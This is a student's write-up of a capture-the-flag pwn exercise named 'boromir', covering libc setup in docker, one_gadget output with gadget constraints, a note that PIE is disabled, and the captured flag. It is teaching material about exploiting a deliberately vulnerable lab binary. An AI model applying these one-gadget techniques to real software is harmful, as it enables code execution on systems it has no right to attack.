# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "boromir"
- story:  There is a legend of the One Gadget to pwn them all. Could you help the Fellowship of the Ring find their way to Mordor by using this One Gadget? Be careful, some men have lost their minds to the ease of using the One Gadget, but there are constraints you need to be aware of to use it properly.
- Hint: You can use the one_gadget tool to search for One Gadgets in libc.
- Hint: One does not simply use a One Gadget, you may need to adjust your buffer to make sure the One Gadget finds writable memory. The vmmap command in pwndbg (or info proc mappings in plain GDB) can help you with this.
- Hint: Remember to use the correct offset to compute the address of libc from the leak.

## Setup
- setup correct libc
```
docker compose up
docker ps
docker exec -it d384ee4cd127 /bin/bash
cd /lib/x86_64-linux-gnu
docker cp d384ee4cd127:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /home/timniklas/Code/software_security_1/homework_03/14_boromir
pwninit
```
- verify that it worked
```
LD_DEBUG=libs ./vuln_patched
```

## Exploit
- remove local objdump
```
sudo mv /usr/local/bin/objdump{,-local}
```
- use onegadget
```
one_gadget ./libc.so.6
```
```
0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xd509f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
```
- PIE is disabled => we can write into well known bss.
-flag
```
softsec{rEXoYZcuTCJ1bAg4BbcowoJZLDrj94jGponxA8fWpy5p5aathB99zFhTLs6BK1Ij}
```